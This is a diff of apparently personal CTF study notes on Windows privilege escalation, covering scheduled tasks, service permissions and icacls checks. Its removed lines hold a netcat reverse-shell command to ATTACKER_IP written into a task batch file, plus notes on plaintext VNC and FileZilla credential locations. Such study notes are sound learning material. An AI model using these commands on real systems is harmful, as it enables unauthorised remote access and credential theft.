@@ -1,7 +1,5 @@
-* `schtasks /query /tn vulntask /fo list /v`: look for ones in which we can inject/modify the binary
-* Start task manually `schtasks /run /tn vulntask` (CTF)
-* `icacls c:\tasks\schtask.bat`: check permissions (F=Full Access)
-* (cmd) `echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > task.bat`
+icacls file: check permissions
+=> F=Full Access
 * Windows installer files (-f msi -o malicious.msi)
 * Windows services are managed by the Service Control Manager (SCM).
 * `sc qc` (ahah, my steel moutain)
@@ -14,19 +12,3 @@
   * https://askubuntu.com/questions/1075098/remmina-scaling-options
 * Insecure Service Permissions
 * XXX
-* https://tryhackme.com/room/windowsprivesc20 (dropped fur now)
-* XXX
-* Moar
-  * https://github.com/bitsadmin/wesng
-  * https://blog.bitsadmin.com/blog/windows-security-updates-for-hackers
-  * https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
-  * https://github.com/gtworek/Priv2Admin
-  * https://github.com/antonioCoco/RogueWinRM
-  * https://jlajara.gitlab.io/Potatoes_Windows_Privesc
-  * https://decoder.cloud/
-  * https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf
-  * https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
-
-On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at C:\Program Files\FileZilla Server\FileZilla Server.xml
-or C:\xampp\FileZilla Server\FileZilla Server.xml
-. These can be MD5 hashes or in plaintext, depending on the version.
